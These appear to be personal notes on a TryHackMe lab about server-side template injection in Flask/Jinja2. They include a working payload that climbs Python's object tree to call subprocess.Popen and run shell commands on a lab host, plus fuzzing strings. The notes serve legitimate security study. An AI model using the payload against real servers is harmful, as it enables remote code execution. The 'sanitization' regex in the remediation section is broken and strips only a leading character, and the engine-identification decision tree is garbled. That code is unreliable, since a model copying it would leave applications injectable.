#SSTI 

https://tryhackme.com/room/learnssti

## What is Server Side Template Injection?

**Server Side Template Injection (SSTI) is a web exploit which takes advantage of an insecure implementation of a template engine.

**What is a template engine?**﻿ 
A template engine allows you to create static template files which can be re-used in your application.

What does that mean? Consider a page that stores information about a user, `/profile/<user>`. The code might look something like this in Python's Flask:

```python
from flask import Flask, render_template_string 
app = Flask(__name__) 
@app.route("/profile/<user>") 
def profile_page(user): 
	template = f"<h1>Welcome to the profile of {user}!</h1>" 
	return render_template_string(template) 
	
app.run()
```

This code creates a template string, and concatenates the user input into it. This way, the content can be loaded dynamically for each user, while keeping a consistent page format.

> [!info] Note: 
> Flask is the web framework, while Jinja2 is the template engine being used.

﻿**How is SSTI exploitable?**
﻿
﻿Consider the above code, specifically the **template** string. The variable `user` (which is user input) is concatenated directly into the template, rather than passed in as data. This means whatever is supplied as user input will be interpreted by the engine.

> [!info] Note: 
> The template engines themselves aren't vulnerable, rather an insecure implementation by the developer.

**What is the impact of SSTI?  

**As the name suggests, SSTI is a server side exploit, rather than client side such as cross site scripting (XSS).

This means that vulnerabilities are even more critical, because instead of an account on the website being hijacked (common use of XSS), the server instead gets hijacked.

The possibilities are endless, however the main goal is typically to gain remote code execution.

You can access the web server by navigating to `http://MACHINE_IP:5000` 

## detection

**Finding an injection point**  
- The exploit must be inserted somewhere, this is called an injection point.
- There are a few places we can look within an application, such as the URL or an input box (make sure to check for hidden inputs).

```
http://MACHINE_IP:5000/profile/<user>
```

**Fuzzing  
- Fuzzing is a technique to determine whether the server is vulnerable by sending multiple characters in hopes to interfere with the backend system.
- This can be done manually, or by an application such as BurpSuite's Intruder. However, for educational purposes, we will look at the manual process.
- Luckily for us, most template engines will use a similar character set for their "special functions" which makes it relatively quick to detect if it's vulnerable to SSTI.
```
# characters are known to be used in quite a few template engine
${{<%[%'"}}%

send 1 by 1 following each other

http://MACHINE_IP:5000/profile/${

What sequence of characters causes the application to throw an error?
{{
```

## identification

Now that we have detected what characters caused the application to error, it is time to identify what template engine is being used.

In the best case scenario, the error message will include the template engine, which marks this step complete!  

However, if this is not the case, we can use a decision tree to help us identify the template engine:
```
${7*7}
	a{*comment*}b 
	  L Smarty ${"z".join("ab")}
	  L Mako / Unknown
	
	{{7*7}} -> not vulnerable
	  L {{7*'7'}} 
	     L Jinja2 / Twig / Unknown
```

```
http://10.10.254.18:5000/profile/${7*7}     => ${7*7}
http://10.10.254.18:5000/profile/${{7*7}}   => $49

since it calculated we use ${{}}

Jinja2
```

## syntax

After having identified the template engine, we now need to learn its syntax.

Where better to learn than the official [https://jinja.palletsprojects.com/en/2.11.x/] 

Always look for the following, no matter the language or template engine:
- How to start a print statement  
- How to end a print statement
- How to start a block statement
- How to end a block statement

[https://jinja.palletsprojects.com/en/2.11.x/api/#jinja2.Environment]

```
{{    start of a new print statement
}}    end of a print statement
{%    start of a block statement
%}    end of a block statement
{#    comment
```

## exploitation 

At this point, we know:
- The application is vulnerable to SSTI
- The injection point
- The template engine
- The template engine syntax

﻿**Planning**  
﻿
Let's first plan how we would like to exploit this vulnerability.

Since Jinja2 is a Python based template engine, we will look at ways to run shell commands in Python. A quick Google search brings up a [https://janakiev.com/blog/python-shell-commands/ ]that details different ways to run shell commands. I will highlight a few of them below:

```python
# Method 1 
import os os.system("whoami") 
# Method 2 
import os os.popen("whoami").read() 
# Method 3 
import subprocess subprocess.Popen("whoami", shell=True, stdout=-1).communicate()
```

**Crafting a proof of concept (Generic)**  

Combining all of this knowledge, we are able to build a proof of concept (POC).

payload
```python
# Jinja2 does not use import statement => fail
http://10.10.254.18:5000/profile/{% import os %}{{ os.system("whoami") }}
#-------------------------------------------

# need to use __class__
http://10.10.254.18:5000/profile/{{ ''.__class__ }}
# class attr .__mro__  to climb object tree
http://10.10.254.18:5000/profile/{{ ''.__class__.__mro__ }}
# we want root object 
{{ ''.__class__.__mro__[1] }}

#----- class method .__subclasses__()
{{ ''.__class__.__mro__[1].__subclasses__() }}

# this calls subprocess.Popen
{{ ''.__class__.__mro__[1].__subclasses__()[401] }}

#### full payload 
http://10.10.254.18:5000/profile/{{ ''.__class__.__mro__[1].__subclasses__()[401]("whoami", shell=True, stdout=-1).communicate() }}

# returns (b'jake\n',None)
```

**Finding payloads**  
The process to build a payload takes a little while when doing it for the first time, however it is important to understand why it works.

For quick reference, an amazing GitHub repo has been created as a cheatsheet for payloads for all web vulnerabilities, including SSTI.

The repo is located 
- [https://github.com/swisskyrepo/PayloadsAllTheThing] 
- while the document for SSTI is located 
- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection ]

## Examination 

Now that we've exploited the application, let's see what was actually happening when the payload was injected.

The code that we exploited was the same as shown in Task 1:

```python
from flask import Flask, render_template_string 
app = Flask(__name__) 
@app.route("/profile/<user>") 
def profile_page(user): 
	template = f"<h1>Welcome to the profile of {user}!</h1>" 
	return render_template_string(template) 
app.run()
```

Let's imagine this like a simple find and replace.
Refer to the code below to see exactly how this works:
```python
# Raw code 
template = f"<h1>Welcome to the profile of {user}!</h1>" 
# Code after injecting: TryHackMe 
template = f"<h1>Welcome to the profile of TryHackMe!</h1>" 
# Code after injecting: {{ 7 * 7 }} 
template = f"<h2>Welcome to the profile of {{ 7 * 7 }}!</h1>"
```

As we learned in Task 4, Jinja2 is going to evaluate code that is in-between those sets of characters, which is why the exploit worked.

## remediation 

All this hacking begs the question, what can be done to prevent this from happening in the first place?

﻿**Secure methods**  
﻿
- Most template engines will have a feature that allows you to pass input in as data, rather that concatenating input into the template.  
- In Jinja2, this can be done by using the second argument:

```python
# Insecure: Concatenating 
input template = f"<h1>Welcome to the profile of {user}!</h1>" 
return render_template_string(template) 

# Secure: Passing input as data 
template = "<h1>Welcome to the profile of {{ user }}!</h1>" 
return render_template_string(template, user=user)
```

﻿**Sanitization**
﻿- User input can not be trusted!
- Every place in your application where a user is allowed to add custom content, make sure the input is sanitized!
- This can be done by first planning what character set you want to allow, and adding these to a whitelist.  

In Python, this can be done like so:
```python
import re 
# Remove everything that isn't alphanumeric 
user = re.sub("^[A-Za-z0-9]", "", user) 
template = "<h1>Welcome to the profile of {{ user }}!</h1>" 
return render_template_string(template, user=user)
```
Most importantly, remember to read the documentation of the template engine you are using.

## case study 

**HackerOne Bug Bounty  

**In March 2016, a user reported an SSTI vulnerability in one of Uber's subdomains.

The vulnerability was present within a form that allowed the user to change their profile name. Much like in the example, the user had control over an input which was then reflected back to the user (via email).  

Although the user was unable to gain remote code execution, the vulnerability was still present and they were awarded with a $10,000 bounty!

```
# the payload used
{{'7'*7}}
```

